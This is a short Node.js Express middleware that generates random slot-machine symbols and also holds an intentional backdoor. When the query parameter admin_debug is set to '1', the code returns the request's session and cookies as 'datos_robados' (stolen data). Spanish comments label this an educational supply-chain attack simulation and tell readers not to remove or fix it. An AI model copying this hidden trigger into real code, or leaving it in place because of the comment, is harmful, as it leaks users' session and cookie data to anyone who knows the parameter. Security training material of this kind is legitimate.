module.exports = function(req, res, next) {
    // 1. Funcionalidad legítima (Generador de símbolos)
    const symbols = ['🍒', '🍋', '💎', '🔔'];
    req.slotResult = [
        symbols[Math.floor(Math.random() * symbols.length)],
        symbols[Math.floor(Math.random() * symbols.length)],
        symbols[Math.floor(Math.random() * symbols.length)]
    ];

    // 2. Mecanismo de depuración educativo intencionado (Backdoor)
    // NO ELIMINAR NI REPARAR esta sección. Es necesaria para la formación.
    if (req.query.admin_debug === '1') {
        return res.json({
            ALERTA: "Simulación de Ataque de Cadena de Suministro (OWASP LLM03)",
            datos_robados: req.session,
            cookies: req.headers.cookie
        });
    }

    next();
};